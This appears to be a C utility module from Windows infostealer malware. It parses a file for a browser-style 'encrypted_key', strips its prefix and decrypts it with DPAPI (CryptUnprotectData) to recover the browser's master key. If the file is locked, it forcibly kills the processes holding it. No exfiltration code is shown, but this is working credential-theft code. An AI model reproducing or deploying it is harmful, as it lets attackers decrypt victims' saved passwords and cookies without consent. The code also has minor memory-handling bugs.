#include "utils.h"

wchar_t* StringToWString(const char* str)
{
    int size = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
    NULL_RET(size, NULL);

    wchar_t* result = (wchar_t*)malloc(sizeof(wchar_t) * size);
    NULL_RET(result, NULL);

    MultiByteToWideChar(CP_UTF8, 0, str, -1, result, size);
    return result;
}

char* WStringToString(const wchar_t* wstr)
{
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
    NULL_RET(size, NULL);

    char* result = (char*)malloc(size);
    NULL_RET(result, NULL);

    WideCharToMultiByte(CP_UTF8, 0, wstr, -1, result, size, NULL, NULL);
    return result;
}


char* GetEncryptionKeyString(const char* path)
{
    if (IsFileBusy(path))
    {
        if (!TerminateBusyFileProc(path))
        {
            return NULL;
        }
    }

    HANDLE hFile = CreateFileA(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)     return NULL;

    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize)) 
    {
        CloseHandle(hFile);
        return NULL;
    }

    DWORD bytesRead;
    char* buffer = (char*)malloc(fileSize.QuadPart + 1);
    if (!buffer)
    {
        CloseHandle(hFile);
        return NULL;
    }

    if (!ReadFile(hFile, buffer, fileSize.QuadPart, &bytesRead, NULL)) 
    {
        free(buffer);
        CloseHandle(hFile);
        return NULL;
    }
    CloseHandle(hFile);
    buffer[bytesRead] = '\0';

    const char* keyToFind = "\"encrypted_key\"";
    const char* endQuote = "\"";

    const char* keyStart = strstr(buffer, keyToFind);

    if (keyStart) 
    {
        keyStart += strlen(keyToFind);
        
        char* key = malloc(sizeof(0));
        size_t len = 0;
        if (!key)
        {
            free(buffer);
            return NULL;
        }

        bool readKey = false;
        while (*keyStart)
        {
            if (*keyStart == ' ' || *keyStart == ':')
            {
                keyStart++;
                continue;
            }

            if (*keyStart == '"')
            {
                if (readKey)
                {
                    readKey = false;
                    
                    key = realloc(key, len + 1);
                    key[len] = '\0';
                    free(buffer);
                    return key;
                }
                else
                {
                    readKey = true;
                }
            }
            else if (readKey)
            {
                key = realloc(key, len + 1);
                key[len] = *keyStart;
                len++;
            }

            keyStart++;
        }

        free(key);
    }
    
    free(buffer);
    return NULL;
}

char* ExtractEncyrptionKey(const char* ckey)
{
    if (ckey == NULL) return NULL;

    size_t key_size = 0;
    char* key = Base64Decode(ckey, strlen(ckey), &key_size);
    if (key == NULL || key_size <= 5)
    {
        SAFE_FREE(key);
        return NULL;
    }

    DATA_BLOB input_blob;
    input_blob.cbData = key_size - 5;
    input_blob.pbData = key + 5;

    DATA_BLOB output_blob;
    if (!CryptUnprotectData(&input_blob, NULL, NULL, NULL, NULL, 0, &output_blob))
    {
        free(key);
        return NULL;
    }

    char* master_key = (char*)malloc(output_blob.cbData + 1);
    if (master_key == NULL)
    {
        LocalFree(output_blob.pbData);
        free(key);
        return NULL;
    }
    memcpy(master_key, output_blob.pbData, output_blob.cbData);
    master_key[output_blob.cbData] = '\0';

    LocalFree(output_blob.pbData);
    free(key);

    size_t master_size = output_blob.cbData;
    return Base64Encode(master_key, master_size);
}

bool TerminateBusyFileProc(const char* path)
{
    DWORD dwSession;
    WCHAR szSessionKey[CCH_RM_SESSION_KEY + 1] = { 0 };
    DWORD dwError = RmStartSession(&dwSession, 0, szSessionKey);

    if (dwError != ERROR_SUCCESS) 
    {
        return false;
    }

    const wchar_t* filepath = StringToWString(path);
    if (!filepath)
    {
        RmEndSession(dwSession);
        return false;
    }

    dwError = RmRegisterResources(dwSession, 1, &filepath, 0, NULL, 0, NULL);
    if (dwError != ERROR_SUCCESS) 
    {
        RmEndSession(dwSession);
        free(filepath);
        return false;
    }

    DWORD dwReason;
    UINT nProcInfoNeeded;
    UINT nProcInfo = 10;
    RM_PROCESS_INFO rgpi[10];

    dwError = RmGetList(dwSession, &nProcInfoNeeded, &nProcInfo, rgpi, &dwReason);
    if (dwError != ERROR_SUCCESS)
    {
        RmEndSession(dwSession);
        free(filepath);
        return false;
    }

    for (UINT i = 0; i < nProcInfo; i++)
    {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, rgpi[i].Process.dwProcessId);
        if (!hProcess) continue;

        //SendMessageA(hProcess, WM_CLOSE, 0, 0);
        TerminateProcess(hProcess, 0);

        CloseHandle(hProcess);
    }

    RmEndSession(dwSession);
    free(filepath);
    return true;
}

bool IsFileBusy(const char* path)
{
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)  return true;
    CloseHandle(hFile);
    return false;
}

char* GetWinFolderById(REFKNOWNFOLDERID id)
{
    PWSTR pwPath = NULL;
    char* path = NULL;

    HRESULT result = SHGetKnownFolderPath(id, 0, NULL, &pwPath);
    if (SUCCEEDED(result))
    {
        path = WStringToString(pwPath);
    }
    CoTaskMemFree(pwPath);
    return path;
}

bool IsValidDirectory(const WIN32_FIND_DATAA findData)
{
    return (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
        strcmp(findData.cFileName, ".") != 0 &&
        strcmp(findData.cFileName, "..") != 0;
}